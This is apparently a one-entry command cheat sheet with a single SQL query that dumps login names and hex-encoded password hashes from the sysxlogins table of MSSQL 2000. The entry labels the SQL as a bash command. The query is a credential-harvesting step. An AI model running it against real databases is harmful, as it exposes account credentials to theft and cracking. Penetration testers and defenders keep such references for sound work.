---
id: 8f691a84-cd79-40f3-8d5c-a26de65e3614
name: Retrieve name and hashed password from sysxlogins table in MSSQL 2000
type: command
executor: bash
data: SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
output: null
created_at: '2023-04-06T03:56:21.128399+00:00'
updated_at: '2023-04-10T20:36:43.926869+00:00'
---

# Retrieve name and hashed password from sysxlogins table in MSSQL 2000

```bash
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```
